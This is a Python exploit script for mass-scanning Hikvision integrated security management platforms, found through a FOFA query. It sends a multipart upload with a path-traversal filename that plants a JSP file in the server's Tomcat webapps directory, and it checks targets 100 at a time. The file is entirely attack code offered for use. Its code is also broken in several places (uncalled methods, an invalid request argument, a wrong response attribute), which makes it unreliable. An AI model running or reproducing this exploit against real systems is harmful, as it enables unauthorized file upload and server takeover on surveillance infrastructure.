#fofa:app="HIKVISION-综合安防管理平台"
import argparse,sys,requests,time,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def main():
    banner()
    parser = argparse.ArgumentParser(description="这是脚本的提示信息")
    parser.add_argument('-u','--url',type=str,help="请输入你要查询的url")
    parser.add_argument('-f','--file',type=str,help="请输入你要查询的url文件")
    args = parser.parse_args
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding="utf-8") as fp:
            for i in fp.readlines:
                url_list.append(i.strip().replace("\n",""))
            mp = Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
def banner():
    banner="""
    ██   ██ ██ ██   ██ ██    ██ ██ ███████ ██  ██████  ███    ██      █████  ███    ██ ██    ██ ███████ ██ ██      ███████ ██    ██ ██████  ██       ██████   █████  ██████  
██   ██ ██ ██  ██  ██    ██ ██ ██      ██ ██    ██ ████   ██     ██   ██ ████   ██  ██  ██  ██      ██ ██      ██      ██    ██ ██   ██ ██      ██    ██ ██   ██ ██   ██ 
███████ ██ █████   ██    ██ ██ ███████ ██ ██    ██ ██ ██  ██     ███████ ██ ██  ██   ████   █████   ██ ██      █████   ██    ██ ██████  ██      ██    ██ ███████ ██   ██ 
██   ██ ██ ██  ██   ██  ██  ██      ██ ██ ██    ██ ██  ██ ██     ██   ██ ██  ██ ██    ██    ██      ██ ██      ██      ██    ██ ██      ██      ██    ██ ██   ██ ██   ██ 
██   ██ ██ ██   ██   ████   ██ ███████ ██  ██████  ██   ████     ██   ██ ██   ████    ██    ██      ██ ███████ ███████  ██████  ██      ███████  ██████  ██   ██ ██████  
                                                                                                                                                                         
                                                                                        author:heichao
                                                                                        Version:1.0.0
                                                                                        """
def poc(target):
    url = target + '/center/api/files;.js'
    hander = {
        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15"
    }
    data = {
        """
------WebKitFormBoundaryxxmdzwoe
Content-Disposition: form-data; name="upload";filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/ukgmfyufsi.jsp"
Content-Type:image/jpeg

<%out.println("pboyjnnrfipmplsukdeczudsefxmywex");%>
------WebKitFormBoundaryxxmdzwoe--        
"""
    }
    try:
        respose = requests.post(url=url,hander=hander,data=data,timeout=5,verify=False)
        if respose.code == 200:
            print(f"[+]+{target}有文件上传漏洞")
        else:
            print(f"[-]+{target}没有文件上传漏洞")
    except:
        print(f"[*]+{target} sever error")

if __name__ == '__main__':
    main()
